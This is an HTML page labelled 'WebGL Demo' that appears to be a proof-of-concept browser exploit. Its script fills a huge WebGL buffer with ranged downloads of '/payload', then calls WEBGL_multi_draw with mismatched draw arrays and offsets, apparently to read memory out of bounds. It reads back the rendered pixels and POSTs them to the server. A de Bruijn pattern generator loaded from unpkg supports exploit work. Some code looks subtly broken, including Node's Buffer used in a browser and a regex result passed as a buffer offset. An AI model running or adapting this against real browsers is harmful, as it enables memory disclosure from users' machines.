<!doctype html>
<html lang="en">
    <head>
        <title>WebGL Demo</title>
        <meta charset="utf-8">
        <script src="https://unpkg.com/de-bruijn-generator/src/index.js"></script>
    </head>

    <body>
        <canvas id="glcanvas" width="1" height="1"></canvas>
    </body>

    <script id="vertex" type="x-shader/x-vertex">#version 300 es
        #extension GL_ANGLE_multi_draw : require
        precision highp float;
        in vec4 aVertexColor;
        out vec4 vColor;
        void main() {
            gl_Position = vec4(0,0,0,0);
            gl_PointSize = 1.0;
            vColor = aVertexColor;
        }
    </script>

    <script id="fragment" type="x-shader/x-fragment">#version 300 es
        precision highp float;
        in vec4 vColor;
        out vec4 outColor;
        void main() {
            outColor = vColor;
        }
    </script>

    <script>
        function createShader(gl, type, source) {
            var shader = gl.createShader(type);
            gl.shaderSource(shader, source);
            gl.compileShader(shader);
            var success = gl.getShaderParameter(shader, gl.COMPILE_STATUS);
            if (success) {
                return shader;
            }

            console.log(gl.getShaderInfoLog(shader));
            gl.deleteShader(shader);
        }

        function createProgram(gl, vertexShader, fragmentShader) {
            var program = gl.createProgram();
            gl.attachShader(program, vertexShader);
            gl.attachShader(program, fragmentShader);
            gl.linkProgram(program);
            var success = gl.getProgramParameter(program, gl.LINK_STATUS);
            if (success) {
            return program;
            }

            console.log(gl.getProgramInfoLog(program));
            gl.deleteProgram(program);
        }

        const canvas = document.querySelector('#glcanvas');
        const gl = canvas.getContext('webgl2', {preserveDrawingBuffer: true});
        const generator = deBruijnGenerator.deBruijn(216, 4, true);
        const ext = gl.getExtension('WEBGL_multi_draw');
        const regex = /bytes (\d+)-\d+\/\d+/gm;

        function stringToArrayBuffer(str) {
            let buf = new ArrayBuffer(str.length);
            let bufView = new Uint8Array(buf);

            for (let i=0, strLen=str.length; i<strLen; i++) {
                bufView[i] = str.charCodeAt(i);
            }

            return buf;
        }

        function convert(Uint8Arr) {
            let length = Uint8Arr.length;

            let buffer = Buffer.from(Uint8Arr);
            let result = buffer.readUIntLE(0, length);

            return result;
        }

        function drawScene() {
            var vertexShaderSource = document.querySelector("#vertex").text;
            var fragmentShaderSource = document.querySelector("#fragment").text;
            var vertexShader = createShader(gl, gl.VERTEX_SHADER, vertexShaderSource);
            var fragmentShader = createShader(gl, gl.FRAGMENT_SHADER, fragmentShaderSource);
            var program = createProgram(gl, vertexShader, fragmentShader);

            var vertexColor = gl.getAttribLocation(program, "aVertexColor");
            var colorBuffer = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, colorBuffer);
            gl.bufferData(gl.ARRAY_BUFFER, 0x7fffffff, gl.STATIC_DRAW);

            console.log("Done create buffer");

            for (let i = 0; i < 1023; ++i) {
                let oReq = new XMLHttpRequest();
                oReq.open("GET", "/payload", false);
                oReq.setRequestHeader("Range", `bytes=${i * 0x200000}-${(i + 1) * 0x200000}`);
                oReq.send(null);

                let arrayBuffer = stringToArrayBuffer(oReq.response);
                let myHeader = oReq.getResponseHeader("Content-Range");
                let offset = regex.exec(myHeader);
                if (arrayBuffer && offset) {
                    gl.bufferSubData(gl.ARRAY_BUFFER, offset, arrayBuffer);
                }

            }

            console.log("Done create data");

            gl.clearColor(0, 0, 0, 0);
            gl.clear(gl.COLOR_BUFFER_BIT);
            gl.viewport(0, 0, canvas.width, canvas.height);
            gl.useProgram(program);
            gl.enableVertexAttribArray(vertexColor);
            gl.bindBuffer(gl.ARRAY_BUFFER, colorBuffer);
            gl.vertexAttribPointer(vertexColor, 4, gl.UNSIGNED_BYTE, true, 1, 0);

            var pixels = new Uint8Array(gl.drawingBufferWidth * gl.drawingBufferHeight * 4);

            let firsts = new Array(1, 1, 1, 1);
            let counts = new Int32Array([1, 1, 1, 1]);
            ext.multiDrawArraysWEBGL(gl.POINTS, firsts, 2, counts, 0, firsts.length - 1);

            gl.readPixels(0, 0, gl.drawingBufferWidth, gl.drawingBufferHeight, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
            console.log(pixels);
            let oPost = new XMLHttpRequest();
            oPost.open("POST", "/", false);
            oPost.send(convert(pixels));
            console.log(oPost.response);
        }

        drawScene();

    </script>
</html>
